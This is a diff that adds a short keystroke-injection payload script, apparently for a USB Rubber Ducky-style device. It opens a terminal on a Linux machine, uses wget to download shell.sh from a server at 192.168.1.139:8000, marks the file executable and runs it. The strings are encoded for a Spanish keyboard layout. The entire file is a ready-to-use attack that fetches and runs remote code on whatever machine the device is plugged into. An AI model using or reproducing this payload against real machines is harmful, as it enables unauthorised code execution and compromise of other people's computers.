@@ -1,0 +1,12 @@
+REM Download and execute shell.sh from local server on Linux (Spanish keyboard)
+DELAY 1000
+CTRL-ALT t
+DELAY 500
+STRING wget @http>&&192.168.1.139>8000&shell.sh@ -O @&tmp&shell.sh@
+ENTER
+DELAY 500
+STRING chmod +x @&tmp&shell.sh@
+ENTER
+DELAY 500
+STRING @&tmp&shell.sh@
+ENTER
